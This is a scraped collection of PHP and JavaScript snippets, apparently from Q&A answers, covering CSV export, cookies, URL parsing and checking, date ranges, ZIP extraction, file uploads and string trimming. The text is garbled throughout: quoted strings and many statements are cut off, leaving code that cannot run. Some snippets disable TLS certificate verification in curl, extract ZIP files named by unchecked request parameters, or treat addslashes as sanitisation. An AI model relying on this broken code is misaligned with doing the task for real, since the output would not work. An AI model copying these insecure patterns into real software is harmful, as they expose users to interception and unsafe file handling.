header( header( header( header( header( header( header( $output = fopen( fputs( $output, "\xEF\xBB\xBF" ); fputcsv($output, array( $setutf8 = "SET NAMES utf8"; $q = $conn->query($setutf8); $setutf8c = "SET character_set_results = character_set_server = $qc = $conn->query($setutf8c); $setutf9 = "SET CHARACTER SET utf8"; $q1 = $conn->query($setutf9); $setutf7 = "SET COLLATION_CONNECTION = $q2 = $conn->query($setutf7); $sql = "SELECT id, name, email FROM myguests"; $rows = $conn->query($sql); $arr1= array(); if ($rows->num_rows > 0) { while($row = $rows->fetch_assoc()) { $rcontent = " Name: " . $row["name"]. " - Email: " . $row["email"]; $arr1[]["title"] = $rcontent; } } else { echo "0 results"; } $conn->close(); foreach($arr1 as $result1): fputcsv($output, $result1); endforeach;
$sep = "\t"; $eol = "\n"; $fputcsv = count($headings) ?
$fileUtf8String = file_get_contents("file.ext"); file_put_contents("file.ext", "\xFF\xFE" . mb_convert_encoding($fileUtf8String, "UTF-16LE", "UTF-8"));
setcookie( "CookieName", "CookieValue", time() + (10 * 365 * 24 * 60 * 60) );
setcookie("CookieName", "CookieValue", 2147483647);
Max-Age=value OPTIONAL. The value of the Max-Age attribute is delta-seconds, the lifetime of the cookie in seconds, a decimal non-negative integer. To handle cached cookies correctly, a client SHOULD calculate the age of the cookie according to the age calculation rules in the HTTP/1.1 specification [RFC2616]. When the age is greater than delta-seconds seconds, the client SHOULD discard the cookie. A value of zero means the cookie SHOULD be discarded immediately.
setcookie("CookieName", "CookieValue", 2147483647);
function isCommandLineInterface() { return (php_sapi_name() === }
function is_cli() { if ( defined( { return true; } if ( php_sapi_name() === { return true; } if ( array_key_exists( return true; } if ( empty($_SERVER[ { return true; } if ( !array_key_exists( { return true; } return false; }
function is_cli() { return !http_response_code(); }
if (isset($_SERVER[ print "HTTP request\n"; } else { print "CLI invocation\n"; }
if (array_key_exists( echo "Console invocation"; } else { echo "HTTP invocation"; }
define("IS_CLI_CALL",( strcmp(php_sapi_name(), if(IS_CLI_CALL){ }
/** * Linebreak function * @return "/n" if cli, else return <br> */ protected static function lb(){ return (defined( (empty($_SERVER[ !isset($_SERVER[ }
function at_tty() { return defined("\STDIN") && posix_isatty(\STDIN); }
$host = gethostbyname( $db = new PDO("mysql:host=$host;dbname=" . DATABASE . array(PDO::ATTR_EMULATE_PREPARES => false, PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION));
<?php function curPageURL() { $pageURL = if ($_SERVER["HTTPS"] == "on") { $pageURL .= "s"; } $pageURL .= ": if ($_SERVER["SERVER_PORT"] != "80") { $pageURL .= $_SERVER["SERVER_NAME"] . ":" . $_SERVER["SERVER_PORT"] . $_SERVER["REQUEST_URI"]; } else { $pageURL .= $_SERVER["SERVER_NAME"] . $_SERVER["REQUEST_URI"]; } return $pageURL; } ?>
<?php function reconstruct_url($url){ $url_parts = parse_url($url); $constructed_url = $url_parts[ return $constructed_url; } ?>
function reconstruct_url($url){ $url_parts = parse_url($url); $constructed_url = $url_parts[ return $constructed_url; } $test = array( ); foreach($test as $url){ print_r(parse_url($url)); }
Array ( [scheme] => http [host] => www.mydomian.com [path] => /myurl.html [query] => unwan=abc ) Array ( [scheme] => http [host] => www.mydomian.com [path] => /myurl.html ) Array ( [scheme] => http [host] => www.mydomian.com ) Array ( [path] => mydomian.com/myurl.html [query] => unwan=abc&ab=1 )
foreach($test as $url){ echo reconstruct_url($url) . }
$url = $url_arr = parse_url($url); $query = $url_arr[ print $url = str_replace(array($query, https:
<?php $this_page = basename($_SERVER[ if (strpos($this_page, "?") !== false) $this_page = reset(explode("?", $this_page)); ?>
function request_uri_without_query() { $result = $_SERVER[ $query = $_SERVER[ if(!empty($query)) { $result = str_replace( } return $result; }
function strposa($haystack, $needles=array(), $offset=0) { $chr = array(); foreach($needles as $needle) { $res = strpos($haystack, $needle, $offset); if ($res !== false) $chr[$needle] = $res; } if(empty($chr)) return false; return min($chr); } $i = strposa($_SERVER["REQUEST_URI"], [ echo strrpos($_SERVER["REQUEST_URI"], 0, $i);
function removeQueryStringFromUrl($url) { if (substr($url,0,4) == "http") { $urlPartsArray = parse_url($url); $outputUrl = $urlPartsArray[ } else { $URLexploded = explode("?", $url, 2); $outputUrl = $URLexploded[0]; } return $outputUrl; }
$url_with_querystring = $url_data = parse_url($url_with_querystring); $url_without_querystring = str_replace(
$begin = new DateTime( $end = new DateTime( $interval = DateInterval::createFromDateString( $period = new DatePeriod($begin, $interval, $end); foreach ($period as $dt) { echo $dt->format("l Y-m-d H:i:s\n"); }
$begin = new DateTime( "2015-07-03" ); $end = new DateTime( "2015-07-09" ); for($i = $begin; $i <= $end; $i->modify( echo $i->format("Y-m-d"); }
$startTime = strtotime( $endTime = strtotime( for ( $i = $startTime; $i <= $endTime; $i = $i + 86400 ) { $thisDate = date( }
$startTime = strtotime( $endTime = strtotime( $i = 1; do { $newTime = strtotime( echo $newTime; } while ($newTime < $endTime);
$startTime = strtotime( $endTime = strtotime( do { $startTime = strtotime( echo $startTime; } while ($startTime < $endTime);
$begin = new DateTime( $end = new DateTime( $end = $end->modify( $interval = new DateInterval( $daterange = new DatePeriod($begin, $interval ,$end); foreach($daterange as $date){ echo $date->format("Ymd") . "<br>"; }
/** * Date range * * @param $first * @param $last * @param string $step * @param string $format * @return array */ function dateRange( $first, $last, $step = $dates = []; $current = strtotime( $first ); $last = strtotime( $last ); while( $current <= $last ) { $dates[] = date( $format, $current ); $current = strtotime( $step, $current ); } return $dates; }
print_r( dateRange( Array ( [0] => 2010-07-26 [1] => 2010-07-27 [2] => 2010-07-28 [3] => 2010-07-29 [4] => 2010-07-30 [5] => 2010-07-31 [6] => 2010-08-01 [7] => 2010-08-02 [8] => 2010-08-03 [9] => 2010-08-04 [10] => 2010-08-05 )
function dateRange($first, $last, $step = $dates = array(); $current = strtotime($first); $last = strtotime($last); while( $current <= $last ) { $dates[] = date($format, $current); $current = strtotime($step, $current); } return $dates; }
dateRange($start, $end, "+1 month", "Y-m-d H:i:s");
$date = new Carbon(); $dtStart = $date->startOfMonth(); $dtEnd = $dtStart->copy()->endOfMonth(); $weekendsInMoth = []; while ($dtStart->diffInDays($dtEnd)) { if($dtStart->isWeekend()) { $weekendsInMoth[] = $dtStart->copy(); } $dtStart->addDay(); }
$zip = new ZipArchive; $res = $zip->open( if ($res === TRUE) { $zip->extractTo( $zip->close(); echo } else { echo }
$file = $path = pathinfo(realpath($file), PATHINFO_DIRNAME); $zip = new ZipArchive; $res = $zip->open($file); if ($res === TRUE) { $zip->extractTo($path); $zip->close(); echo "WOOT! $file extracted to $path"; } else { echo "Doh! I couldn }
$zipArchive = new ZipArchive(); $result = $zipArchive->open($_GET["master"]); if ($result === TRUE) { $zipArchive ->extractTo("my_dir"); $zipArchive ->close(); } else { }
<?php $zip_filename = "YOURFILENAME.zip"; ?> <!DOCTYPE html> <html> <head> <meta charset= <title>Unzip</title> <style> body{ font-family: arial, sans-serif; word-wrap: break-word; } .wrapper{ padding:20px; line-height: 1.5; font-size: 1rem; } span{ font-family: background: padding:2px; } </style> </head> <body> <div class="wrapper"> <?php echo "Unzipping <span>" .__DIR__. "/" .$zip_filename. "</span> to <span>" .__DIR__. "</span><br>"; echo "current dir: <span>" . __DIR__ . "</span><br>"; $zip = new ZipArchive; $res = $zip->open(__DIR__ . if ($res === TRUE) { $zip->extractTo(__DIR__); $zip->close(); echo } else { echo } ?> End Script. </div> </body> </html>
<?php $unzip = new ZipArchive; $out = $unzip->open( if ($out === TRUE) { $unzip->extractTo(getcwd()); $unzip->close(); echo } else { echo } ?>
<!DOCTYPE html> <html> <head> <meta charset= <title>Unzip</title> <style> body{ font-family: arial, sans-serif; word-wrap: break-word; } .wrapper{ padding:20px; line-height: 1.5; font-size: 1rem; } span{ font-family: background: padding:2px; } </style> </head> <body> <div class="wrapper"> <?php if(isset($_GET[ { $type = $_GET[ global $con; switch($type) { case { $zip_filename =$_POST[ echo "Unzipping <span>" .__DIR__. "/" .$zip_filename. "</span> to <span>" .__DIR__. "</span><br>"; echo "current dir: <span>" . __DIR__ . "</span><br>"; $zip = new ZipArchive; $res = $zip->open(__DIR__ . if ($res === TRUE) { $zip->extractTo(__DIR__); $zip->close(); echo } else { echo } break; } } } ?> End Script. </div> <form name="unzip" id="unzip" role="form"> <div class="body bg-gray"> <div class="form-group"> <input type="text" name="filename" class="form-control" placeholder="File Name (with extension)"/> </div> </div> </form> <script type="application/javascript"> $(" event.preventDefault(); var url = "function.php?page=unzip"; $.ajax({ type: "POST", url: url, dataType:"json", data: $(" success: function(data) { alert(data.msg); document.getElementById("unzip").reset(); } }); return false; }); </script> </body> </html>
function unzip_file($file, $destination){ $zip = new ZipArchive() ; if ($zip->open($file) !== TRUE) { return false; } $zip->extractTo($destination); $zip->close(); return true; }
function extract_zip($Sourse_file, $extract_folder){ $zip = new ZipArchive() ; if (!$zip->open($Sourse_file) == TRUE) { return false; } $zip->extractTo($extract_folder); $zip->close(); return true; }
<?php $fileName = $_GET[ if (isset($fileName)) { $zip = new ZipArchive; $res = $zip->open($fileName); if ($res === TRUE) { $zip->extractTo( $zip->close(); echo } else { echo } } else { echo } ?>
<?php $zip_obj = new ZipArchive; $zip_obj->open( $zip_obj->extractTo( ?>
<?php $zip_obj = new ZipArchive; if ($zip_obj->open( $zip_obj->extractTo( echo "Zip exists and successfully extracted"; } else { echo "This zip file does not exists"; } ?>
$file = $file_headers = @get_headers($file); if(!$file_headers || $file_headers[0] == $exists = false; } else { $exists = true; }
function url_exists($url) { if (!$fp = curl_init($url)) return false; return true; }
<?php $urls = getUrls(); foreach($urls as $k=>$url){ if( ! isValidUrl($url) ){ unset($urls[$k]); } } echo "yay all done! now show my site"; foreach($urls as $url){ echo "<a href=\"{$url}\">{$url}</a><br/>"; }
function isValidUrl($url){ if(!$url || !is_string($url)){ return false; } if( ! preg_match( return false; } if(getHttpResponseCode_using_curl($url) != 200){ return false; } return true; } function getHttpResponseCode_using_curl($url, $followredirects = true){ if(! $url || ! is_string($url)){ return false; } $ch = @curl_init($url); if($ch === false){ return false; } @curl_setopt($ch, CURLOPT_HEADER ,true); @curl_setopt($ch, CURLOPT_NOBODY ,true); @curl_setopt($ch, CURLOPT_RETURNTRANSFER ,true); if($followredirects){ @curl_setopt($ch, CURLOPT_FOLLOWLOCATION ,true); @curl_setopt($ch, CURLOPT_MAXREDIRS ,10); }else{ @curl_setopt($ch, CURLOPT_FOLLOWLOCATION ,false); } @curl_exec($ch); if(@curl_errno($ch)){ @curl_close($ch); return false; } $code = @curl_getinfo($ch, CURLINFO_HTTP_CODE); @curl_close($ch); return $code; } function getHttpResponseCode_using_getheaders($url, $followredirects = true){ if(! $url || ! is_string($url)){ return false; } $headers = @get_headers($url); if($headers && is_array($headers)){ if($followredirects){ $headers = array_reverse($headers); } foreach($headers as $hline){ if(preg_match( $code = $matches[1]; return $code; } } return false; } return false; }
$headers = @get_headers($this->_value); if(strpos($headers[0],
<?php $url = $array = get_headers($url); $string = $array[0]; if(strpos($string,"200")) { echo } else { echo } ?>
$url = $not_url = if (@file_get_contents($url)): echo "Found else: echo "Can endif; if (@file_get_contents($not_url)): echo "Found else: echo "Can endif;
function URLIsValid($URL) { $exists = true; $file_headers = @get_headers($URL); $InvalidHeaders = array( foreach($InvalidHeaders as $HeaderVal) { if(strstr($file_headers[0], $HeaderVal)) { $exists = false; break; } } return $exists; }
/** * @param $url * @param array $options * @return string * @throws Exception */ function checkURL($url, array $options = array()) { if (empty($url)) { throw new Exception( } $httpStatusCodes = array( 100 => 101 => 102 => 200 => 201 => 202 => 203 => 204 => 205 => 206 => 207 => 208 => 226 => 300 => 301 => 302 => 303 => 304 => 305 => 306 => 307 => 308 => 400 => 401 => 402 => 403 => 404 => 405 => 406 => 407 => 408 => 409 => 410 => 411 => 412 => 413 => 414 => 415 => 416 => 417 => 418 => 422 => 423 => 424 => 425 => 426 => 428 => 429 => 431 => 449 => 450 => 500 => 501 => 502 => 503 => 504 => 505 => 506 => 507 => 508 => 509 => 510 => 511 => 599 => ); $ch = curl_init($url); curl_setopt($ch, CURLOPT_NOBODY, true); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); if (isset($options[ $timeout = (int) $options[ curl_setopt($ch, CURLOPT_TIMEOUT, $timeout); } curl_exec($ch); $returnedStatusCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); curl_close($ch); if (array_key_exists($returnedStatusCode, $httpStatusCodes)) { return "URL: } else { return " } }
get_headers(): SSL operation failed with code 1. OpenSSL Error messages: error:14090086:SSL routines:SSL3_GET_SERVER_CERTIFICATE:certificate verify failed Array ( [url] => https: [exists] => ) get_headers(): Failed to enable crypto Array ( [url] => https: [exists] => ) get_headers(https: Array ( [url] => https: [exists] => )
/** * Send an HTTP request to a the $url and check the header posted back. * * @param $url String url to which we must send the request. * @param $failCodeList Int array list of code for which the page is considered invalid. * * @return Boolean */ public static function isUrlExists($url, array $failCodeList = array(404)){ $exists = false; if(!StringManager::stringStartWith($url, "http") and !StringManager::stringStartWith($url, "ftp")){ $url = "https: } if (preg_match(RegularExpression::URL, $url)){ $handle = curl_init($url); curl_setopt($handle, CURLOPT_RETURNTRANSFER, true); curl_setopt($handle, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($handle, CURLOPT_HEADER, true); curl_setopt($handle, CURLOPT_NOBODY, true); curl_setopt($handle, CURLOPT_USERAGENT, true); $headers = curl_exec($handle); curl_close($handle); if (empty($failCodeList) or !is_array($failCodeList)){ $failCodeList = array(404); } if (!empty($headers)){ $exists = true; $headers = explode(PHP_EOL, $headers); foreach($failCodeList as $code){ if (is_numeric($code) and strpos($headers[0], strval($code)) !== false){ $exists = false; break; } } } } return $exists; }
public function testIsUrlExists(){ $this->assertFalse(ToolManager::isUrlExists("woot")); $this->assertFalse(ToolManager::isUrlExists("https: $this->assertFalse(ToolManager::isUrlExists("https: $this->assertFalse(ToolManager::isUrlExists("https: $this->assertFalse(ToolManager::isUrlExists("https: $this->assertFalse(ToolManager::isUrlExists("https: $this->assertFalse(ToolManager::isUrlExists("https: $this->assertFalse(ToolManager::isUrlExists("https: $this->assertFalse(ToolManager::isUrlExists("https: $this->assertTrue(ToolManager::isUrlExists("www.google.ca")); $this->assertTrue(ToolManager::isUrlExists("https: $this->assertTrue(ToolManager::isUrlExists("https: $this->assertTrue(ToolManager::isUrlExists("https: $this->assertTrue(ToolManager::isUrlExists("https: $this->assertTrue(ToolManager::isUrlExists("https: $this->assertTrue(ToolManager::isUrlExists("https: $this->assertTrue(ToolManager::isUrlExists("https: $this->assertTrue(ToolManager::isUrlExists("https: $this->assertTrue(ToolManager::isUrlExists("https: }
function http_response($url){ $resURL = curl_init(); curl_setopt($resURL, CURLOPT_URL, $url); curl_setopt($resURL, CURLOPT_BINARYTRANSFER, 1); curl_setopt($resURL, CURLOPT_HEADERFUNCTION, curl_setopt($resURL, CURLOPT_FAILONERROR, 1); curl_exec ($resURL); $intReturnCode = curl_getinfo($resURL, CURLINFO_HTTP_CODE); curl_close ($resURL); if ($intReturnCode != 200 && $intReturnCode != 302 && $intReturnCode != 304) { return 0; } else return 1; } echo echo http_response( echo echo http_response(
/** * Check that given URL is valid and exists. * @param string $url URL to check * @return bool TRUE when valid | FALSE anyway */ function urlExists ( $url ) { $url = filter_var($url, FILTER_SANITIZE_URL); if (filter_var($url, FILTER_VALIDATE_URL) === FALSE || !in_array(strtolower(parse_url($url, PHP_URL_SCHEME)), [ ) { return false; } $file_headers = @get_headers($url); return !(!$file_headers || $file_headers[0] === }
function urlIsOk($url) { $headers = @get_headers($url); $httpStatus = intval(substr($headers[0], 9, 3)); if ($httpStatus<400) { return true; } return false; }
function get_http_response_code($theURL) { $headers = @get_headers($theURL); return substr($headers[0], 9, 3); }
function urlExists($url) { if (@file_get_contents($url,false,NULL,0,1)) { return true; } return false; }
<?php $mylinks="http: $handlerr = curl_init($mylinks); curl_setopt($handlerr, CURLOPT_RETURNTRANSFER, TRUE); $resp = curl_exec($handlerr); $ht = curl_getinfo($handlerr, CURLINFO_HTTP_CODE); if ($ht == { echo else { echo ?>
<?php if (isValidURL("http: echo "URL is valid..."; } else { echo "URL is not valid..."; } function isValidURL($url) { $file_headers = @get_headers($url); if (strpos($file_headers[0], "200 OK") > 0) { return true; } else { return false; } } ?>
$image_path = $file_headers = @get_headers($image_path); if($file_headers[0] == echo }else{ echo }
function url_exists($url) { $headers = @get_headers($url); return (strpos($headers[0], }
function urlExists($url=NULL) { if($url == NULL) return false; $ch = curl_init($url); curl_setopt($ch, CURLOPT_TIMEOUT, 5); curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $data = curl_exec($ch); $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE); curl_close($ch); if($httpcode>=200 && $httpcode<300){ return true; } else { return false; } }
$array = get_headers($url); $string = $array[0]; print_r($string) Array ( [0] => HTTP/1.0 301 Moved Permanently [1] => Date: Fri, 09 Nov 2018 16:12:29 GMT [2] => Server: Apache/2.4.34 (FreeBSD) LibreSSL/2.7.4 PHP/7.0.31 [3] => X-Powered-By: PHP/7.0.31 [4] => Set-Cookie: landing=%2Freed-diffuser-fig-pudding-50; path=/; HttpOnly [5] => Location: /reed-diffuser-fig-pudding-50/ [6] => Content-Length: 0 [7] => Connection: close [8] => Content-Type: text/html; charset=utf-8 [9] => HTTP/1.0 404 Not Found [10] => Date: Fri, 09 Nov 2018 16:12:29 GMT [11] => Server: Apache/2.4.34 (FreeBSD) LibreSSL/2.7.4 PHP/7.0.31 [12] => X-Powered-By: PHP/7.0.31 [13] => Set-Cookie: landing=%2Freed-diffuser-fig-pudding-50%2F; path=/; HttpOnly [14] => Connection: close [15] => Content-Type: text/html; charset=utf-8 )
/** * returns true/false if the $url is present. * * @param string $url assumes this is a valid url. * * @return bool */ private function url_exists (string $url): bool { $ch = curl_init($url); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_NOBODY, TRUE); curl_setopt($ch, CURLOPT_HEADER, TRUE); curl_setopt($ch, CURLOPT_SSL_VERIFYSTATUS, FALSE); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE); curl_setopt($ch, CURLOPT_USERAGENT, curl_exec($ch); $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE); if (($http_code >= HTTP_OK && $http_code < HTTP_BAD_REQUEST) || $http_code === 999) { curl_close($ch); return TRUE; } $error = curl_error($ch); curl_close($ch); stream_context_set_default(array( $file_headers = @get_headers($url); if ($file_headers) { $response_code = substr($file_headers[0], 9, 3); return $response_code >= 200 && $response_code < 400; } return FALSE; }
class HttpClient { public function request() { return HttpResponse::build(); } }
class HttpClient { private $httpResponseFactory; public function __construct($httpResponseFactory) { $this->httpResponseFactory = $httpResponseFactory; } public function request() { return $this->httpResponseFactory->build(); } }
$httpResponseFactory = new HttpResponseFactory; $httpClient = new HttpClient($httpResponseFactory); $httpResponse = $httpClient->request();
$db = new DbConnection; $users = new UserCollection($db); $posts = new PostCollection($db); $comments = new CommentsCollection($db);
/** * An example of a test using PHPUnit. The point is to see how easy it is to * pass the UserCollection constructor an alternative implementation of * DbCollection. */ class UserCollection extends PHPUnit_Framework_TestCase { public function testGetAllComments() { $mockedMethods = array( $dbMock = $this->getMock( $dbMock->expects($this->any()) ->method( ->will($this->returnValue(array( $userCollection = new UserCollection($dbMock); $allUsers = $userCollection->getAll(); $this->assertEquals(array( } }
class blog_post { public $title; public $my_dao; public function find_related() { $this->my_dao->find_all_with_title_words($this->title); } }
class blog_post_helper { public static function find_related($blog_post) { } }
html::set_attribute( html::tag( $str=html::get_buffer();
$form = new form(stuff here); $form->add(new text(stuff here)); $form->add(new submit(stuff here)); $form->render();
$someRecordsFromDb1 = $db1->getRows($selectStatement); $someRecordsFromDb2 = $db2->getRows($selectStatement);
foreach ($someRecordsFromDb1 as $row) { $row->someFieldValue = $row->anotherDbField = 1; $row->save(); } foreach ($someRecordsFromDb2 as $row) { $row->delete(); }
sudo apt-get install php5.6-soap service php5.6-fpm restart service apache2 restart
sudo apt-get install php7.0-soap sudo systemctl restart php7.0-fpm sudo systemctl restart nginx
upload_max_filesize = 1000M; post_max_size = 1000M;
<?php echo "int\n"; echo "1 !== 0: "; var_dump(1 !== 0); echo "1 !== 1: "; var_dump(1 !== 1); echo "1 ==! 0: "; var_dump(1 ==! 0); echo "1 ==! 1: "; var_dump(1 ==! 1); echo "bool\n"; echo "true !== false: "; var_dump(true !== false); echo "true !== true: "; var_dump(true !== true); echo "true ==! false: "; var_dump(true ==! false); echo "true ==! true: "; var_dump(true ==! true); echo "string\n"; echo echo echo echo ?>
true ==! false: bool(true) true ==! true: bool(false)
$input = array("a", "b", "c", "d", "e"); $output = array_slice($input, 0, 3);
<?php $input = array("a", "b", "c", "d", "e"); $output = array_slice($input, 2); $output = array_slice($input, -2, 1); $output = array_slice($input, 0, 3); print_r(array_slice($input, 2, -1)); print_r(array_slice($input, 2, -1, true)); ?>
curl_setopt($process, CURLOPT_CAINFO, dirname(__FILE__) . curl_setopt($process, CURLOPT_SSL_VERIFYPEER, true);
public function chargeStripe() { $stripe = new Stripe; $stripe = Stripe::make(env( $charge = $stripe->charges()->create([ ]); dd($charge); return Redirect::route( }
;;;;;;;;;;;;;;;;;;;; ; php.ini Options ; ;;;;;;;;;;;;;;;;;;;; curl.cainfo = "C:\xampp\php\extras\ssl\cacert.pem"
echo "openssl.cafile: ", ini_get( echo "curl.cainfo: ", ini_get(
$http = new GuzzleHttp\Client([ $client = new Google_Client(); $client->setHttpClient($http);
CONNECTED(00000003) depth=0 CN = example.com verify error:num=20:unable to get local issuer certificate verify return:1 depth=0 CN = example.com verify error:num=21:unable to verify the first certificate verify return:1
curl.cainfo ="C:/DevPrograms/wamp64/bin/php/cacert.pem"
openssl.cafile="C:/DevPrograms/wamp64/bin/php/cacert.pem"
curl_setopt($process, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($process, CURLOPT_CAINFO, dirname(__FILE__) . DIRECTORY_SEPARATOR .
<form method="POST" id="contact" name="13" class="form-horizontal wpc_contact" novalidate="novalidate" enctype="multipart/form-data"> <fieldset> <div id="legend" class=""> <legend class="">file demoe 1</legend> <div id="alert-message" class="alert hidden"></div> </div> <div class="control-group"> <!-- Text input--> <label class="control-label" for="input01">Text input</label> <div class="controls"> <input type="text" placeholder="placeholder" class="input-xlarge" name="name"> <p class="help-block" style="display:none;">text_input</p> </div> <div class="control-group"> </div> <label class="control-label">File Button</label> <!-- File Upload --> <div class="controls"> <input class="input-file" id="fileInput" type="file" name="file"> </div> </div> <div class="control-group"> <!-- Button --> <div class="controls"> <button class="btn btn-success">Button</button> </div> </div> </fieldset> </form>
<script> $( var formname = $( var form = $( var FormData = new FormData($(form)[1]); $.ajax({ url : data : {form:form,formname:formname,ipadd:ipadd,FormData:FormData}, type : processData: false, contentType: false, success : function(data){ alert(data); } }); }
var formData = new FormData(); formData.append( formData.append( formData.append(
$.ajax({ url: data: formData, type: contentType: false, processData: false, });
$.ajax({ url: data: formData, type: "POST", contentType: false, processData: false, })
<form id="upload_form" enctype="multipart/form-data">
var formData = new FormData($( formData.append( $.ajax({ type: "POST", url: base_url + "member/upload/", data: formData, contentType: false, processData: false, beforeSend: function() { $( base_url + $(".modal").modal("show"); }, success: function(msg) { $(".modal .ajax_data").html("<pre>" + msg + "</pre>"); $( }, error: function() { $(".modal .ajax_data").html( "<pre>Sorry! Couldn ); $( } });
var form = $( var formData = new FormData(form); formData.append(
$( event.preventDefault(); var formData = new FormData($(this)[0]); $.ajax({ url: type: data: formData, async: false, cache: false, contentType: false, processData: false, success: function (returndata) { if(returndata == { swal({ title: "Great", text: "Your Form has Been Transfer, We will comfirm the amount you reload in 3 hours", type: "success", showCancelButton: false, confirmButtonColor: " confirmButtonText: "OK", closeOnConfirm: false }, function(){ window.location.href = }); } else if(returndata == { sweetAlert("Offline", "Please use other payment method", "error"); } } }); });
View: <label class="btn btn-info btn-file"> Import <input type="file" style="display: none;"> </label> <Script> $(document).ready(function () { $(document).on( var fileUpload = $(this).get(0); var files = fileUpload.files; var bid = 0; if (files.length != 0) { var data = new FormData(); for (var i = 0; i < files.length ; i++) { data.append(files[i].name, files[i]); } $.ajax({ xhr: function () { var xhr = $.ajaxSettings.xhr(); xhr.upload.onprogress = function (e) { console.log(Math.floor(e.loaded / e.total * 100) + }; return xhr; }, contentType: false, processData: false, type: data: data, url: success: function (response) { location.href = } }); } }); }); </Script> Controller: [HttpPost] public ActionResult ControllerX(string id) { var files = Request.Form.Files; ...
<?php $Date = "2010-09-17"; echo date( echo date( ?>
$Date1 = $date = new DateTime($Date1); $date->add(new DateInterval( $Date2 = $date->format(
$Date1 = $date = new DateTime($Date1); $date->modify( $Date2 = $date->format(
$date = date("Y-m-d"); $mod_date = strtotime($date."+ 2 days"); echo date("Y-m-d",$mod_date) . "\n"; $mod_date = strtotime($date."- 2 days"); echo date("Y-m-d",$mod_date) . "\n"; $mod_date = strtotime($date."+ 1 months"); echo date("Y-m-d",$mod_date) . "\n"; $mod_date = strtotime($date."+ 1 years"); echo date("Y-m-d",$mod_date) . "\n";
strtotime("-3 days", time()); strtotime("+1 day", strtotime($date));
strtotime("+1 day", strtotime("+1 year", strtotime($date)));
$myDate = "2014-01-16"; $nDays = 16; $newDate = strtotime($myDate . echo newDate(
$date=date_create("2013-03-15");\\or your date string date_add($date,date_interval_create_from_date_string("40 days"));\\add number of days echo date_format($date,"Y-m-d");\\set date format of the result
<?php function trim_value(&$value) { $value = trim($value); } $fruit = array( var_dump($fruit); array_walk($fruit, var_dump($fruit); ?>
function trimData($data){ if($data == null) return null; if(is_array($data)){ return array_map( }else return trim($data); }
$arr=[" aaa ", " b ", "m ", [" .e ", " 12 3", "9 0 0 0 "]]; print_r(trimData($arr));
foreach($array as $key => $value) { $array[$key] = trim($value); print("-"); print($array[$key]); print("-"); print("<br>"); }
if (is_array($array)) { foreach ($array as $key => $val) { $array[$key] = trim($val); } }
function generateRandomString($length = 10) { $characters = $charactersLength = strlen($characters); $randomString = for ($i = 0; $i < $length; $i++) { $randomString .= $characters[rand(0, $charactersLength - 1)]; } return $randomString; } function generateRandomSpaces() { $output = $i = rand(1, 10); for ($j = 0; $j <= $i; $j++) { $output .= " "; } return $output; } $array = []; for ($i = 0; $i <= 1000; $i++) { $array[] = generateRandomSpaces() . generateRandomString(10) . generateRandomSpaces(); } $start = microtime(true); for ($i = 0; $i < 100000; $i++) { $trimmed_array=array_map( } $time = (microtime(true) - $start); echo "Array map: " . $time . " seconds\n"; $start = microtime(true); for ($i = 0; $i < 100000; $i++) { array_walk($array, } $time = (microtime(true) - $start); echo "Array walk : " . $time . " seconds\n"; $start = microtime(true); for ($i = 0; $i < 100000; $i++) { foreach ($array as $index => $elem) { $array[$index] = trim($elem); } } $time = (microtime(true) - $start); echo "Foreach: " . $time . " seconds\n"; $start = microtime(true); for ($i = 0; $i < 100000; $i++) { for ($j = 0; $j < count($array) - 1; $j++) { $array[$j] = trim($array[$j]); } } $time = (microtime(true) - $start); echo "For: " . $time . " seconds\n";
$data = array_map( function ($item) { return is_string($item) ? trim($item) : $item; }, $data );
$result = array_map(function($v){ return is_string($v)?trim($v):$v; }, $array);
function trimArray(&$value) { $value = trim($value); } $pmcArray = array( array_walk($pmcArray,
class Something { public function getEmailText($vars) { $text = The second line starts two lines below. I also don return $text; } }
public function getEmailText($vars) { $text = "Hello {$vars->name},\n\rThe second line starts two lines below.\n\rI also don return $text; }
$var = "some text"; $text = <<<EOT Place your text between the EOT. It the delimiter that ends the text of your multiline string. $var EOT;
$text = . "\r\n\r\n" . . "\r\n\r\n" . . return $text;
$var = $str = <<<MARKER this is a very long string that doesn horizontal scrolling, and interpolates variables : Hello, $var! MARKER;
$text = "Hello, {$vars->name},\r\n\r\n" . "The second line starts two lines below.\r\n" . ".. Third line... etc";
$var = "pizza"; $text = implode(" ", [ "I love me some", "really large", $var, "pies.", ]);
function ShowFileExtension($filepath) { preg_match( $string = $matches[0]; $pattern = preg_split( if(count($pattern) > 1) { $filenamepart = $pattern[count($pattern)-1][0]; preg_match( return strtolower($matches[0]); } }
$path_parts = pathinfo( echo $path_parts[ echo $path_parts[ echo $path_parts[ echo $path_parts[
$path = "/home/httpd/html/index.php"; $file = basename($path); $file = basename($path, ".php");
$fileName = basename($filePath); $fileNameNoExtension = preg_replace("/\.[^.]+$/", "", $fileName);
$path = "/home/httpd/html/index.php"; $ext = pathinfo($path, PATHINFO_EXTENSION); $file = basename($path, ".".$ext);
$exploded_filepath = explode(".", $filepath_or_URL); $extension = end($exploded_filepath); echo basename($filepath_or_URL, ".".$extension );
<?php $path = "http: echo basename($path, ".php"); ?>
$path = "/etc/sudoers.php"; print array_shift(explode(".", basename($path))); $file = "file_name.php"; print array_shift(explode(".", basename($file)));
function removeExt($path) { $basename = basename($path); return strpos($basename, } echo removeExt( echo removeExt( echo removeExt( echo removeExt(
$question = trim($_POST[ if ("" === "$question") { }
function IsNullOrEmptyString($str){ return (!isset($str) || trim($str) === }
"" (an empty string) 0 (0 as an integer) 0.0 (0 as a float) "0" (0 as a string) NULL FALSE array() (an empty array) $var; (a variable declared, but without a value)
$question = $_POST[ if (!is_string || ($question = trim($question))) { }
class Request { function get($key, $default=null, $from=null) { if ($from) : if (isset(${ return sanitize(${ else if isset($_REQUEST[$key]) return sanitize($_REQUEST[$key]); return $default; } function sanitize($data) { return addslashes(trim($data)); } function isEmptyString($data) { return (trim($data) === "" or $data === null); } function exists($key) {} function setFlash($name, $value) {} [...] } $request = new Request(); $question= $request->get( print $request->isEmptyString($question);
